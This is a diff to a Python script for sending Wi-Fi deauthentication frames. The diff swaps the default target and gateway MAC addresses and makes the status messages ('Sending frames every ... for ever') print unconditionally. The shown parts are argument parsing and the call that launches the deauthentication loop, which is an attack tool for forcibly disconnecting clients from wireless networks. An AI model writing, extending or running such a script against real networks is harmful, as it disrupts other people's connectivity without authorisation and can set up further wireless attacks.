@@ -22,8 +22,8 @@ def deauth(target_mac, gateway_mac, reason_code, inter=0.1, count=None, loop=1, 
 if __name__ == '__main__':
     import argparse
 
-    DEFAULT_TARGET = "ac:12:03:da:a2:87"
-    DEFAULT_GATEWAY = "aa:db:03:6b:e1:38"
+    DEFAULT_TARGET = "9c:b6:d0:b6:d9:dd"
+    DEFAULT_GATEWAY = "f2:91:bb:b7:82:b7"
     DEFAULT_WLAN = "wlan0"
     parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
     parser.add_argument("--target", help="Target MAC address to deauthenticate.", default=DEFAULT_TARGET)
@@ -53,10 +53,9 @@ if __name__ == '__main__':
     else:
         loop = 0
     # printing some info messages"
-    if verbose:
-        if count:
-            print(f"[+] Sending {count} frames every {interval}s...")
-        else:
-            print(f"[+] Sending frames every {interval}s for ever...")
+    if count:
+        print(f"[+] Sending {count} frames every {interval}s...")
+    else:
+        print(f"[+] Sending frames every {interval}s for ever...")
 
     deauth(target, gateway, reason_code, interval, count, loop, iface, verbose)
